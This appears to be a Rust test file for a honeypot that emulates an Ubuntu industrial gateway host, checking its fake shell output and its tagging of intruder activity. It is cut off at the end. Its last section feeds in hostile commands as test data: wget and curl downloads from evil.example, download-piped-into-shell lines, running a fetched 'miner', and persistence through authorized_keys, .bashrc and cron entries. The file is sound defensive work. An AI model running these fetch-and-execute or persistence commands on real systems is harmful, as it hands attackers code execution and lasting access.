//! Scenario tests: drive an emulated host through the `Host` interface exactly
//! as a behavior does, using the command lines attackers actually type.

use hp_core::{Host, HostFactory, HostReply};
use hp_world::{HostSpec, World};

/// Fri 2025-10-31 18:22:09 UTC.
const NOW: i64 = 1_761_934_929;

fn default_spec() -> String {
    hp_world::spec::DEFAULT_HOST.to_string()
}

fn world(spec: &str) -> World {
    World::new(HostSpec::parse(spec).expect("valid spec"))
}

fn host_for(spec: &str, user: &str) -> Box<dyn Host> {
    let mut h = world(spec).start_with_clock(Box::new(|| NOW));
    h.login(user);
    h
}

fn admin() -> Box<dyn Host> {
    host_for(&default_spec(), "admin")
}

fn root() -> Box<dyn Host> {
    host_for(&default_spec(), "root")
}

fn run(h: &mut Box<dyn Host>, line: &str) -> HostReply {
    h.run(line)
}

fn out(h: &mut Box<dyn Host>, line: &str) -> String {
    h.run(line).output
}

fn tags(h: &mut Box<dyn Host>, line: &str) -> Vec<String> {
    h.run(line).tags
}

// ------------------------------------------------------------ identity

#[test]
fn login_sets_user_prompt_and_home() {
    let mut a = admin();
    assert_eq!(out(&mut a, "pwd"), "/home/admin\n");
    assert_eq!(run(&mut a, "").prompt, "admin@plc-gw-03:~$ ");
    let mut r = root();
    assert_eq!(run(&mut r, "").prompt, "root@plc-gw-03:~# ", "root gets #");
    assert_eq!(out(&mut r, "pwd"), "/root\n");
    assert_eq!(a.var("user").as_deref(), Some("admin"));
    assert_eq!(a.var("hostname").as_deref(), Some("plc-gw-03"));
    assert_eq!(a.var("cwd").as_deref(), Some("/home/admin"));
    assert_eq!(a.var("nope"), None);
}

#[test]
fn login_prints_a_banner_built_from_the_spec() {
    let mut h = world(&default_spec()).start_with_clock(Box::new(|| NOW));
    let r = h.login("admin");
    assert!(
        r.output
            .starts_with("Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\n\n"),
        "{}",
        r.output
    );
    assert!(
        r.output
            .ends_with("Last login: Tue Oct 28 17:13:22 2025 from 10.20.0.14\n"),
        "{}",
        r.output
    );
    assert_eq!(r.prompt, "admin@plc-gw-03:~$ ");
    // it follows the spec, not a hard-coded string
    let other = default_spec()
        .replace("Ubuntu 22.04.3 LTS\"", "Debian 12\"")
        .replace("login_from: 10.20.0.14", "login_from: 1.2.3.4");
    let mut h = world(&other).start_with_clock(Box::new(|| NOW));
    let r = h.login("admin");
    assert!(
        r.output.starts_with("Welcome to Debian 12 (GNU/Linux")
            && r.output.contains("from 1.2.3.4"),
        "{}",
        r.output
    );
}

#[test]
fn identity_commands() {
    let mut a = admin();
    assert_eq!(out(&mut a, "whoami"), "admin\n");
    assert_eq!(
        out(&mut a, "id"),
        "uid=1000(admin) gid=1000(admin) groups=1000(admin),20(dialout)\n"
    );
    assert_eq!(out(&mut a, "id -u"), "1000\n");
    assert_eq!(out(&mut a, "id -un"), "admin\n");
    assert_eq!(out(&mut a, "groups"), "admin dialout\n");
    assert_eq!(out(&mut a, "hostname"), "plc-gw-03\n");
    assert_eq!(out(&mut a, "hostname -I"), "10.20.0.31 \n");
    assert_eq!(out(&mut a, "cat /etc/hostname"), "plc-gw-03\n");
    let mut r = root();
    assert_eq!(
        out(&mut r, "id"),
        "uid=0(root) gid=0(root) groups=0(root)\n"
    );
}

#[test]
fn uname_in_all_its_forms() {
    let mut a = admin();
    assert_eq!(
        out(&mut a, "uname -a"),
        "Linux plc-gw-03 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n"
    );
    assert_eq!(out(&mut a, "uname"), "Linux\n");
    assert_eq!(out(&mut a, "uname -r"), "5.15.0-91-generic\n");
    assert_eq!(out(&mut a, "uname -m"), "x86_64\n");
    assert_eq!(out(&mut a, "uname -sr"), "Linux 5.15.0-91-generic\n");
    assert_eq!(out(&mut a, "uname -n"), "plc-gw-03\n");
}

#[test]
fn os_files_agree_with_the_spec() {
    let mut a = admin();
    let rel = out(&mut a, "cat /etc/os-release");
    assert!(
        rel.contains("PRETTY_NAME=\"Ubuntu 22.04.3 LTS\"")
            && rel.contains("VERSION_CODENAME=jammy"),
        "{rel}"
    );
    assert!(out(&mut a, "cat /proc/version").starts_with("Linux version 5.15.0-91-generic"));
    assert_eq!(out(&mut a, "cat /proc/cpuinfo | grep -c processor"), "2\n");
    assert_eq!(out(&mut a, "nproc"), "2\n");
    assert!(out(&mut a, "cat /proc/cpuinfo | grep 'model name'").contains("Xeon(R) CPU E5-2680 v4"));
    assert!(out(&mut a, "cat /proc/meminfo").starts_with("MemTotal:        4025016 kB"));
}

// --------------------------------------------------------- navigation

#[test]
fn cd_updates_the_prompt_and_reports_errors_like_bash() {
    let mut a = admin();
    assert_eq!(run(&mut a, "cd /tmp").prompt, "admin@plc-gw-03:/tmp$ ");
    assert_eq!(out(&mut a, "pwd"), "/tmp\n");
    assert_eq!(run(&mut a, "cd ~").prompt, "admin@plc-gw-03:~$ ");
    run(&mut a, "mkdir work");
    assert_eq!(run(&mut a, "cd work").prompt, "admin@plc-gw-03:~/work$ ");
    assert_eq!(run(&mut a, "cd ..").prompt, "admin@plc-gw-03:~$ ");
    assert_eq!(run(&mut a, "cd -").prompt, "admin@plc-gw-03:~/work$ ");
    assert_eq!(
        out(&mut a, "cd /nope"),
        "-bash: cd: /nope: No such file or directory\n"
    );
    assert_eq!(
        out(&mut a, "cd /etc/passwd"),
        "-bash: cd: /etc/passwd: Not a directory\n"
    );
    assert_eq!(
        out(&mut a, "cd /root"),
        "-bash: cd: /root: Permission denied\n"
    );
    assert_eq!(
        a.var("cwd").as_deref(),
        Some("/home/admin/work"),
        "failed cds change nothing"
    );
    assert_eq!(
        run(&mut a, "cd").prompt,
        "admin@plc-gw-03:~$ ",
        "bare cd goes home"
    );
}

#[test]
fn ls_plain_long_and_hidden() {
    let mut a = admin();
    assert_eq!(out(&mut a, "ls"), "notes.txt\n");
    assert_eq!(
        out(&mut a, "ls -a"),
        ".  ..  .bash_logout  .bashrc  notes.txt  .profile\n"
    );
    assert_eq!(out(&mut a, "ls -la").lines().next().unwrap(), "total 24");
    assert_eq!(
        out(&mut a, "ls -l"),
        "total 4\n-rw-r--r-- 1 admin admin 72 Oct 15  2024 notes.txt\n"
    );
    assert_eq!(
        out(&mut a, "ls /nope"),
        "ls: cannot access '/nope': No such file or directory\n"
    );
    assert_eq!(
        out(&mut a, "ls /root"),
        "ls: cannot open directory '/root': Permission denied\n"
    );
    assert_eq!(out(&mut a, "ls /etc/hostname"), "/etc/hostname\n");
}

#[test]
fn ls_of_several_arguments_labels_each_directory() {
    let mut a = admin();
    let o = out(&mut a, "ls /opt /var/log");
    assert!(
        o.contains("/opt:\nplc\n") && o.contains("/var/log:\n"),
        "{o}"
    );
}

#[test]
fn ls_sorts_like_a_real_locale_and_shows_modes() {
    let mut r = root();
    run(&mut r, "cd /tmp; touch B a C; mkdir d; chmod 4755 a");
    assert_eq!(out(&mut r, "ls"), "a  B  C  d\n");
    let l = out(&mut r, "ls -l");
    assert!(
        l.contains("-rwsr-xr-x 1 root root    0 Oct 31 18:22 a"),
        "{l}"
    );
    assert!(
        l.contains("drwxr-xr-x 2 root root 4096 Oct 31 18:22 d"),
        "{l}"
    );
    assert!(
        out(&mut r, "ls -ld /tmp").starts_with("drwxrwxrwt"),
        "sticky bit shows as t"
    );
    assert!(out(&mut r, "ls -lh /etc/passwd").starts_with("-rw-r--r--"));
}

#[test]
fn ls_wraps_into_columns_when_the_names_are_long() {
    let mut r = root();
    run(&mut r, "cd /tmp");
    for i in 0..12 {
        run(&mut r, &format!("touch file_number_{i:02}.txt"));
    }
    let o = out(&mut r, "ls");
    assert!(
        o.lines().count() > 1 && o.lines().all(|l| l.len() <= 80),
        "{o}"
    );
    assert!(o.contains("file_number_00.txt") && o.contains("file_number_11.txt"));
}

// --------------------------------------------------------- reading files

#[test]
fn cat_and_friends_report_errors_like_coreutils() {
    let mut a = admin();
    assert_eq!(out(&mut a, "cat notes.txt").lines().count(), 2);
    assert_eq!(
        out(&mut a, "cat /nope"),
        "cat: /nope: No such file or directory\n"
    );
    assert_eq!(out(&mut a, "cat /etc"), "cat: /etc: Is a directory\n");
    assert_eq!(
        out(&mut a, "cat /etc/shadow"),
        "cat: /etc/shadow: Permission denied\n"
    );
    assert_eq!(
        out(&mut a, "cat /etc/hostname /etc/hostname"),
        "plc-gw-03\nplc-gw-03\n"
    );
    assert_eq!(out(&mut a, "cat -n /etc/hostname"), "     1\tplc-gw-03\n");
    assert_eq!(
        out(&mut a, "head -n 1 notes.txt"),
        "TODO: rotate historian creds\n"
    );
    assert_eq!(
        out(&mut a, "head -1 notes.txt"),
        "TODO: rotate historian creds\n"
    );
    assert_eq!(
        out(&mut a, "tail -n 1 notes.txt"),
        "plc-gw-02 firmware update scheduled for Q1\n"
    );
    assert_eq!(
        out(&mut a, "head /nope"),
        "head: cannot open '/nope' for reading: No such file or directory\n"
    );
    assert_eq!(out(&mut a, "wc -l notes.txt"), "      2 notes.txt\n");
    assert_eq!(out(&mut a, "cat notes.txt | wc -l"), "2\n");
    assert_eq!(
        out(&mut a, "wc /etc/hostname"),
        "      1       1      10 /etc/hostname\n"
    );
}

#[test]
fn root_can_read_what_admin_cannot() {
    let mut r = root();
    assert!(out(&mut r, "cat /etc/shadow").starts_with("root:!:19650"));
    assert!(out(&mut r, "ls -a /root").contains(".bashrc"));
}

#[test]
fn grep_in_its_common_forms() {
    let mut a = admin();
    assert_eq!(out(&mut a, "grep root /etc/passwd").lines().count(), 1);
    assert!(
        out(&mut a, "grep -c : /etc/passwd")
            .trim()
            .parse::<u32>()
            .unwrap()
            > 10
    );
    assert_eq!(
        out(&mut a, "grep -i ROTATE notes.txt"),
        "TODO: rotate historian creds\n"
    );
    assert_eq!(
        out(&mut a, "grep -v TODO notes.txt"),
        "plc-gw-02 firmware update scheduled for Q1\n"
    );
    assert_eq!(
        out(&mut a, "grep -n plc notes.txt"),
        "2:plc-gw-02 firmware update scheduled for Q1\n"
    );
    assert_eq!(
        out(&mut a, "grep -o 'plc-gw-0[0-9]' notes.txt"),
        "plc-gw-02\n"
    );
    assert_eq!(out(&mut a, "cat notes.txt | grep -c ."), "2\n");
    assert_eq!(out(&mut a, "grep nomatch notes.txt; echo $?"), "1\n");
    assert_eq!(out(&mut a, "grep -F 'a.b' notes.txt; echo $?"), "1\n");
    assert!(out(&mut a, "grep '(' notes.txt").contains("Invalid regular expression"));
    assert!(out(&mut a, "grep x /nope").contains("grep: /nope: No such file or directory"));
    assert_eq!(out(&mut a, "grep -q TODO notes.txt; echo $?"), "0\n");
}

// -------------------------------------------------------- shell syntax

#[test]
fn redirects_pipes_and_connectors() {
    let mut a = admin();
    assert_eq!(out(&mut a, "echo hi > f; cat f"), "hi\n");
    assert_eq!(out(&mut a, "echo more >> f; cat f"), "hi\nmore\n");
    assert_eq!(out(&mut a, "echo gone > f; cat f"), "gone\n", "> truncates");
    assert_eq!(out(&mut a, "cat /nope 2>/dev/null; echo rc=$?"), "rc=1\n");
    assert_eq!(
        out(&mut a, "cat /nope >/dev/null 2>&1; echo rc=$?"),
        "rc=1\n"
    );
    assert_eq!(out(&mut a, "cat /nope 2>&1 | wc -l"), "1\n");
    assert_eq!(out(&mut a, "false && echo no"), "");
    assert_eq!(out(&mut a, "false || echo yes"), "yes\n");
    assert_eq!(out(&mut a, "true && echo a && echo b"), "a\nb\n");
    assert_eq!(out(&mut a, "echo a; echo b"), "a\nb\n");
    assert_eq!(
        out(&mut a, "echo a &"),
        "a\n",
        "background is just foreground here"
    );
    assert_eq!(
        out(&mut a, "echo x > /etc/passwd"),
        "-bash: /etc/passwd: Permission denied\n"
    );
    assert_eq!(
        out(&mut a, "echo x > /nope/f"),
        "-bash: /nope/f: No such file or directory\n"
    );
    assert_eq!(
        out(&mut a, "echo x > /tmp"),
        "-bash: /tmp: Is a directory\n"
    );
    assert_eq!(out(&mut a, "cat < f"), "gone\n");
    assert_eq!(
        out(&mut a, "cat < /nope"),
        "-bash: /nope: No such file or directory\n"
    );
    assert_eq!(
        out(&mut a, "> empty; wc -c empty"),
        "      0 empty\n",
        "a bare redirect creates the file"
    );
}

#[test]
fn quoting_variables_and_globs() {
    let mut a = admin();
    assert_eq!(
        out(&mut a, "echo \"$HOME\" '$HOME' ~ $USER"),
        "/home/admin $HOME /home/admin admin\n"
    );
    assert_eq!(out(&mut a, "echo a$NOPE-b"), "a-b\n");
    assert_eq!(
        out(&mut a, "export GREETING=hi; echo $GREETING ${GREETING}x"),
        "hi hix\n"
    );
    assert_eq!(out(&mut a, "FOO=bar; echo $FOO"), "bar\n");
    assert_eq!(out(&mut a, "unset FOO; echo [$FOO]"), "[]\n");
    run(&mut a, "cd /tmp; touch a.txt b.txt c.log");
    assert_eq!(out(&mut a, "ls *.txt"), "a.txt  b.txt\n");
    assert_eq!(out(&mut a, "echo *.log"), "c.log\n");
    assert_eq!(
        out(&mut a, "echo *.nomatch"),
        "*.nomatch\n",
        "no match keeps the pattern"
    );
    assert_eq!(
        out(&mut a, "echo '*.txt'"),
        "*.txt\n",
        "quoted globs are literal"
    );
    assert_eq!(out(&mut a, "echo [ab].txt"), "a.txt b.txt\n");
    run(&mut a, "rm *.txt");
    assert_eq!(out(&mut a, "ls"), "c.log\n");
}

#[test]
fn errors_look_like_bash() {
    let mut a = admin();
    assert_eq!(
        out(&mut a, "frobnicate --now"),
        "-bash: frobnicate: command not found\n"
    );
    assert_eq!(
        out(&mut a, "frobnicate; echo $?"),
        "-bash: frobnicate: command not found\n127\n"
    );
    assert_eq!(
        out(&mut a, "echo 'unterminated"),
        "-bash: unexpected EOF while looking for matching `''\n"
    );
    assert_eq!(
        out(&mut a, "ls ;; ls"),
        "-bash: syntax error near unexpected token `;'\n"
    );
    assert_eq!(
        out(&mut a, "./nothing"),
        "-bash: ./nothing: No such file or directory\n"
    );
    assert_eq!(out(&mut a, "/tmp"), "-bash: /tmp: Is a directory\n");
    assert_eq!(
        out(&mut a, "$NOPE"),
        "",
        "an empty command line is not an error"
    );
    assert_eq!(out(&mut a, "# a comment"), "");
    assert_eq!(out(&mut a, "   "), "");
}

#[test]
fn sh_dash_c_runs_its_argument() {
    let mut a = admin();
    assert_eq!(out(&mut a, "sh -c 'echo hi; whoami'"), "hi\nadmin\n");
    assert_eq!(out(&mut a, "bash -c \"echo \\$HOME\""), "/home/admin\n");
    assert_eq!(
        out(&mut a, "echo 'echo piped; id -u' | sh"),
        "piped\n1000\n"
    );
}

/// `sh -c '...'` nested `n` levels deep, with correct shell quoting.
fn nest(n: usize) -> String {
    if n == 0 {
        "echo deep".to_string()
    } else {
        format!("sh -c '{}'", nest(n - 1).replace('\'', "'\\''"))
    }
}

#[test]
fn nesting_is_bounded() {
    let mut a = admin();
    assert_eq!(out(&mut a, &nest(2)), "deep\n", "ordinary nesting works");
    let deep = out(&mut a, &nest(8));
    assert!(deep.contains("maximum nesting depth exceeded"), "{deep:?}");
    let wrappers = out(&mut a, &format!("{}echo hi", "nohup ".repeat(10)));
    assert!(
        wrappers.contains("maximum nesting depth exceeded"),
        "{wrappers:?}"
    );
    assert_eq!(out(&mut a, "echo still works"), "still works\n");
}

#[test]
fn history_env_and_clear() {
    let mut a = admin();
    run(&mut a, "ls");
    run(&mut a, "whoami");
    assert_eq!(
        out(&mut a, "history"),
        "    1  ls\n    2  whoami\n    3  history\n"
    );
    let env = out(&mut a, "env");
    assert!(
        env.contains("USER=admin\n")
            && env.contains("HOME=/home/admin\n")
            && env.contains("SHELL=/bin/bash\n"),
        "{env}"
    );
    assert_eq!(out(&mut a, "printenv HOME"), "/home/admin\n");
    assert_eq!(out(&mut a, "clear"), "\x1b[H\x1b[2J\x1b[3J");
}

// ------------------------------------------------------ changing things

#[test]
fn files_and_directories_can_be_created_moved_copied_and_removed() {
    let mut a = admin();
    assert_eq!(out(&mut a, "mkdir work; cd work; touch a; ls"), "a\n");
    assert_eq!(
        out(&mut a, "mkdir a"),
        "mkdir: cannot create directory ‘a’: File exists\n"
    );
    assert_eq!(out(&mut a, "mkdir -p x/y/z; ls x/y"), "z\n");
    assert_eq!(
        out(&mut a, "mkdir -p x/y/z; echo ok"),
        "ok\n",
        "-p tolerates existing"
    );
    assert_eq!(
        out(&mut a, "mkdir /etc/foo"),
        "mkdir: cannot create directory ‘/etc/foo’: Permission denied\n"
    );
    assert_eq!(
        out(&mut a, "mkdir /nope/x"),
        "mkdir: cannot create directory ‘/nope/x’: No such file or directory\n"
    );
    assert_eq!(out(&mut a, "cp a b; ls"), "a  b  x\n");
    assert_eq!(out(&mut a, "mv b c; ls"), "a  c  x\n");
    assert_eq!(
        out(&mut a, "cp x y"),
        "cp: -r not specified; omitting directory 'x'\n"
    );
    assert_eq!(out(&mut a, "cp -r x y; ls y"), "y\n");
    assert_eq!(
        out(&mut a, "cp /nope z"),
        "cp: cannot stat '/nope': No such file or directory\n"
    );
    assert_eq!(
        out(&mut a, "cp c /nope/z"),
        "cp: cannot create regular file '/nope/z': No such file or directory\n"
    );
    assert_eq!(
        out(&mut a, "mv a x; ls x"),
        "a  y\n",
        "moving into a directory"
    );
    assert_eq!(out(&mut a, "rm c; ls"), "x  y\n");
    assert_eq!(
        out(&mut a, "rm x"),
        "rm: cannot remove 'x': Is a directory\n"
    );
    assert_eq!(out(&mut a, "rm -r x y; ls"), "");
    assert_eq!(
        out(&mut a, "rm /nope"),
        "rm: cannot remove '/nope': No such file or directory\n"
    );
    assert_eq!(out(&mut a, "rm -f /nope; echo $?"), "0\n");
    assert_eq!(
        out(&mut a, "rm /etc/passwd"),
        "rm: cannot remove '/etc/passwd': Permission denied\n"
    );
    assert_eq!(
        out(&mut a, "rm"),
        "rm: missing operand\nTry 'rm --help' for more information.\n"
    );
    assert_eq!(
        out(&mut a, "cp a"),
        "cp: missing destination file operand after 'a'\nTry 'cp --help' for more information.\n"
    );
}

#[test]
fn copies_belong_to_whoever_made_them() {
    let mut r = root();
    run(&mut r, "cd /tmp; cp /etc/hostname h");
    assert!(out(&mut r, "ls -l h").contains(" root root "));
    let mut a = admin();
    run(&mut a, "cd /tmp; cp /etc/hostname h2");
    assert!(
        out(&mut a, "ls -l h2").contains(" admin admin "),
        "cp makes new files owned by the copier"
    );
}

#[test]
fn chmod_chown_and_permissions() {
    let mut a = admin();
    run(&mut a, "touch f");
    assert_eq!(
        out(&mut a, "chmod 600 f; ls -l f"),
        "-rw------- 1 admin admin 0 Oct 31 18:22 f\n"
    );
    assert_eq!(
        out(&mut a, "chmod u+x,go-r f; ls -l f")
            .split_whitespace()
            .next(),
        Some("-rwx------")
    );
    assert_eq!(
        out(&mut a, "chmod +x f; ls -l f").split_whitespace().next(),
        Some("-rwx--x--x")
    );
    assert_eq!(
        out(&mut a, "chmod 99x f"),
        "chmod: invalid mode: ‘99x’\nTry 'chmod --help' for more information.\n"
    );
    assert_eq!(
        out(&mut a, "chmod 644 /nope"),
        "chmod: cannot access '/nope': No such file or directory\n"
    );
    assert_eq!(
        out(&mut a, "chmod 777 /etc/passwd"),
        "chmod: changing permissions of '/etc/passwd': Operation not permitted\n"
    );
    assert_eq!(
        out(&mut a, "chown root f"),
        "chown: changing ownership of 'f': Operation not permitted\n"
    );
    let mut r = root();
    run(&mut r, "touch /tmp/g; chown admin:dialout /tmp/g");
    assert!(out(&mut r, "ls -l /tmp/g").contains(" admin dialout "));
}

#[test]
fn a_directory_you_cannot_search_reveals_nothing_about_its_contents() {
    let mut a = admin();
    assert_eq!(
        out(&mut a, "cat /root/.bashrc"),
        "cat: /root/.bashrc: Permission denied\n"
    );
    assert_eq!(
        out(&mut a, "ls /root/.ssh"),
        "ls: cannot access '/root/.ssh': Permission denied\n"
    );
    // ...including whether a name exists: both must give the same answer
    assert_eq!(
        out(&mut a, "cat /root/definitely-not-here"),
        "cat: /root/definitely-not-here: Permission denied\n"
    );
    assert_eq!(
        out(&mut a, "ls /root/definitely-not-here"),
        "ls: cannot access '/root/definitely-not-here': Permission denied\n"
    );
}

#[test]
fn echo_dash_e_and_printf_can_write_a_binary() {
    let mut a = admin();
    run(
        &mut a,
        r"echo -e '\x7fELF\x02\x01\x01' > bin; printf '\x00\x01' >> bin",
    );
    assert_eq!(out(&mut a, "wc -c bin"), "     10 bin\n");
    assert_eq!(out(&mut a, "printf '%s-%d\\n' a 1"), "a-1\n");
}

#[test]
fn base64_round_trip_through_a_pipe() {
    let mut a = admin();
    assert_eq!(out(&mut a, "echo -n foobar | base64"), "Zm9vYmFy\n");
    assert_eq!(out(&mut a, "echo Zm9vYmFy | base64 -d"), "foobar");
}

// ---------------------------------------------------------- system info

#[test]
fn system_reports_are_consistent() {
    let mut a = admin();
    assert_eq!(
        out(&mut a, "uptime"),
        " 18:22:09 up 41 days,  6:57,  1 user,  load average: 0.08, 0.03, 0.01\n"
    );
    assert_eq!(
        out(&mut a, "uptime -p"),
        "up 41 days, 6 hours, 57 minutes\n"
    );
    assert_eq!(out(&mut a, "date"), "Fri Oct 31 18:22:09 UTC 2025\n");
    assert_eq!(out(&mut a, "date +%Y-%m-%d"), "2025-10-31\n");
    let w = out(&mut a, "w");
    assert!(
        w.contains("USER     TTY      FROM") && w.contains("admin    pts/0    10.20.0.14"),
        "{w}"
    );
    assert_eq!(
        out(&mut a, "who"),
        "admin    pts/0        2025-10-31 18:22 (10.20.0.14)\n"
    );
    let free = out(&mut a, "free -m");
    assert!(free.starts_with("               total        used        free      shared  buff/cache   available\nMem:"), "{free}");
    assert!(
        free.contains("Mem:            3930") && free.contains("Swap:           2047"),
        "{free}"
    );
    assert!(out(&mut a, "free -h").contains("3.8Gi"));
    assert!(out(&mut a, "df -h").contains("/dev/sda2        39G"));
    assert!(out(&mut a, "df").contains("1K-blocks"));
}

#[test]
fn processes_include_the_spec_and_the_session() {
    let mut a = admin();
    let ps = out(&mut a, "ps");
    assert!(
        ps.starts_with("    PID TTY          TIME CMD\n")
            && ps.contains("bash")
            && ps.contains(" ps\n"),
        "{ps}"
    );
    let aux = out(&mut a, "ps aux");
    assert!(aux.starts_with("USER         PID %CPU %MEM"), "{aux}");
    assert!(
        aux.contains("/usr/sbin/sshd -D") && aux.contains("modbusd") && aux.contains("-bash"),
        "{aux}"
    );
    assert!(out(&mut a, "ps -ef").starts_with("UID          PID    PPID"));
    assert_eq!(out(&mut a, "ps aux | grep -c modbusd").trim(), "1");
}

#[test]
fn network_reports_use_the_spec() {
    let mut a = admin();
    let ip = out(&mut a, "ip a");
    assert!(
        ip.contains("1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN"),
        "{ip}"
    );
    assert!(
        ip.contains("2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP"),
        "{ip}"
    );
    assert!(
        ip.contains("link/ether 00:50:56:a1:3c:9e brd ff:ff:ff:ff:ff:ff"),
        "{ip}"
    );
    assert!(
        ip.contains("inet 10.20.0.31/24 brd 10.20.0.255 scope global eth0"),
        "{ip}"
    );
    assert_eq!(
        out(&mut a, "ip route"),
        "default via 10.20.0.1 dev eth0 proto static\n10.20.0.0/24 dev eth0 proto kernel scope link src 10.20.0.31\n"
    );
    assert_eq!(
        out(&mut a, "ip bogus"),
        "Object \"bogus\" is unknown, try \"ip help\".\n"
    );
    assert_eq!(
        out(&mut a, "ifconfig"),
        "-bash: ifconfig: command not found\n",
        "net-tools is not on a stock Ubuntu server"
    );
}

#[test]
fn which_stubs_and_wrappers() {
    let mut a = admin();
    assert_eq!(
        out(&mut a, "which wget awk"),
        "/usr/bin/wget\n/usr/bin/awk\n"
    );
    assert_eq!(
        out(&mut a, "which cd; echo $?"),
        "1\n",
        "builtins are not files"
    );
    assert_eq!(out(&mut a, "command -v curl"), "/usr/bin/curl\n");
    assert_eq!(
        out(&mut a, "awk '{print $1}' /etc/passwd"),
        "",
        "present but not emulated: silent success"
    );
    assert_eq!(out(&mut a, "nohup echo hi"), "hi\n");
    assert_eq!(
        out(&mut a, "sleep 30; echo woke"),
        "woke\n",
        "sleep does not block"
    );
    assert_eq!(out(&mut a, "true; echo $?"), "0\n");
    assert_eq!(out(&mut a, "false; echo $?"), "1\n");
}

// ---------------------------------------------------- the attacker's moves

#[test]
fn wget_makes_a_payload_land_without_touching_the_network() {
    let mut a = admin();
    let r = run(&mut a, "cd /tmp; wget http://evil.example/x/bot.sh");
    assert_eq!(r.tags, ["payload_fetch"]);
    let o = &r.output;
    assert!(
        o.contains("--2025-10-31 18:22:09--  http://evil.example/x/bot.sh\n"),
        "{o}"
    );
    assert!(
        o.contains("Resolving evil.example (evil.example)... "),
        "{o}"
    );
    assert!(
        o.contains("HTTP request sent, awaiting response... 200 OK\n"),
        "{o}"
    );
    assert!(
        o.contains("Saving to: ‘bot.sh’\n") && o.contains("‘bot.sh’ saved ["),
        "{o}"
    );
    assert!(
        out(&mut a, "ls -l bot.sh").contains(" admin admin "),
        "the file really is in the filesystem"
    );
    assert!(out(&mut a, "head -1 bot.sh").starts_with("#!/bin/sh"));
    // wget does not clobber
    let again = run(&mut a, "wget http://evil.example/x/bot.sh");
    assert!(
        again.output.contains("Saving to: ‘bot.sh.1’"),
        "{}",
        again.output
    );
    assert!(out(&mut a, "ls").contains("bot.sh.1"));
}

#[test]
fn wget_options() {
    let mut a = admin();
    run(&mut a, "cd /tmp");
    assert_eq!(
        out(&mut a, "wget -q http://e.example/a.bin; ls"),
        "a.bin\n",
        "quiet prints nothing"
    );
    assert!(out(&mut a, "wget -O out.bin http://e.example/a.bin").contains("Saving to: ‘out.bin’"));
    assert!(out(&mut a, "ls").contains("out.bin"));
    assert_eq!(
        tags(&mut a, "wget -qO- http://e.example/a.sh").as_slice(),
        ["payload_fetch"]
    );
    assert!(
        out(&mut a, "wget -qO- http://e.example/a.sh").starts_with("#!/bin/sh"),
        "-O- writes to stdout"
    );
    run(&mut a, "mkdir dl; wget -q -P dl http://e.example/z.bin");
    assert_eq!(out(&mut a, "ls dl"), "z.bin\n");
    assert!(out(&mut a, "wget").contains("wget: missing URL"));
    assert_eq!(
        out(&mut a, "wget -q -O /etc/x http://e.example/a.bin"),
        "",
        "quiet wget fails quietly"
    );
    assert!(out(&mut a, "wget -O /etc/x http://e.example/a.bin").contains("Permission denied"));
    assert!(
        out(&mut a, "wget e.example/f.txt")
            .contains("--2025-10-31 18:22:09--  http://e.example/f.txt"),
        "a bare host is http"
    );
}

#[test]
fn curl_options() {
    let mut a = admin();
    run(&mut a, "cd /tmp");
    let r = run(&mut a, "curl http://e.example/a.sh");
    assert_eq!(r.tags, ["payload_fetch"]);
    assert!(
        r.output.starts_with("#!/bin/sh"),
        "no -o means the body goes to stdout"
    );
    let r = run(&mut a, "curl -sO http://e.example/b.bin");
    assert_eq!(r.output, "");
    assert!(out(&mut a, "ls").contains("b.bin"));
    assert!(out(&mut a, "curl -o c.bin http://e.example/b.bin").contains("% Total    % Received"));
    assert!(out(&mut a, "ls").contains("c.bin"));
    assert_eq!(
        out(
            &mut a,
            "curl -fsSL -o d.bin https://e.example/b.bin; ls d.bin"
        ),
        "d.bin\n"
    );
    assert_eq!(
        out(
            &mut a,
            "curl -A 'x' -H 'y: z' -X GET http://e.example/q -o e.bin -s; ls e.bin"
        ),
        "e.bin\n"
    );
    assert!(out(&mut a, "curl").contains("curl: try 'curl --help'"));
}

#[test]
fn running_a_downloaded_file_is_flagged_but_does_nothing() {
    let mut a = admin();
    run(&mut a, "cd /tmp; wget -q http://evil.example/miner");
    let perm = run(&mut a, "./miner");
    assert_eq!(perm.output, "-bash: ./miner: Permission denied\n");
    assert!(perm.tags.is_empty(), "not executable yet: nothing ran");
    run(&mut a, "chmod +x miner");
    let r = run(&mut a, "./miner");
    assert_eq!(r.output, "");
    assert_eq!(r.tags, ["payload_exec"]);
    assert_eq!(
        tags(&mut a, "/tmp/miner").as_slice(),
        ["payload_exec"],
        "by absolute path too"
    );
    assert_eq!(tags(&mut a, "sh miner").as_slice(), ["payload_exec"]);
    assert!(
        tags(&mut a, "cd /opt/plc; ./gateway.py").is_empty(),
        "files that shipped with the host are not payloads"
    );
}

#[test]
fn piping_a_download_into_a_shell_is_flagged_and_not_interpreted() {
    let mut a = admin();
    for line in [
        "curl -s http://e.example/i.sh | sh",
        "wget -qO- http://e.example/i.sh | bash",
        "curl http://e.example/i.sh | sh -s",
    ] {
        let r = run(&mut a, line);
        assert_eq!(r.output, "", "{line}");
        assert_eq!(r.tags, ["payload_fetch", "payload_exec"], "{line}");
    }
    // ...but text the attacker typed is run, since it is their own commands
    assert_eq!(out(&mut a, "echo 'whoami' | sh"), "admin\n");
}

#[test]
fn a_script_the_attacker_wrote_is_flagged_when_run() {
    let mut a = admin();
    run(
        &mut a,
        "echo 'curl http://e.example/x | sh' > /tmp/run.sh; chmod +x /tmp/run.sh",
    );
    assert_eq!(tags(&mut a, "/tmp/run.sh").as_slice(), ["payload_exec"]);
}

#[test]
fn persistence_attempts_are_flagged() {
    let mut a = admin();
    run(&mut a, "mkdir -p ~/.ssh");
    assert_eq!(
        tags(&mut a, "echo ssh-rsa AAAA > ~/.ssh/authorized_keys").as_slice(),
        ["persistence_attempt"]
    );
    assert_eq!(
        tags(&mut a, "echo 'curl x|sh' >> ~/.bashrc").as_slice(),
        ["persistence_attempt"]
    );
    assert_eq!(
        tags(&mut a, "echo '* * * * * x' | crontab -").as_slice(),
        ["persistence_attempt"]
    );
    assert_eq!(out(&mut a, "crontab -l"), "no crontab for admin\n");
    assert!(tags(&mut a, "echo x > /tmp/harmless").is_empty());
    let mut r = root();
    assert_eq!(
        tags(&mut r, "echo '@reboot /tmp/x' > /etc/cron.d/x").as_slice(),
